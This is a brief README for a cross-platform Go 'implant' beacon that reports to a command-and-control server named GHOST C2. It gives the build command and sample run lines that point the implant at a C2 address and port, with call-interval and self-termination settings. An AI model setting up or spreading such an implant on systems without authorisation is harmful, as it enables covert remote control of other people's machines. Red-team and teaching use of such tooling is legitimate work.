# Beacon for GHOST

* Cross Platform
* Simple Setup
* Talks to GHOST [C2](https://github.com/bartimus-primed/c2)

### How To

#### Command Format:
#### `implant_executable C2_ADDRESS C2_PORT CALL_INTERVAL DEATH_TIME`
#### supports XXs XXm XXh XXd (seconds, minutes, hours) for the CALL_INTERVAL and DEATH_TIME

run: `go build implant`
* Windows: `.\implant 192.168.253.1 50555 3s 15s`
* Linux: `./implant 192.168.253.1 50555 3s 15s`
* MacOS: haven't tested but should be the same as linux.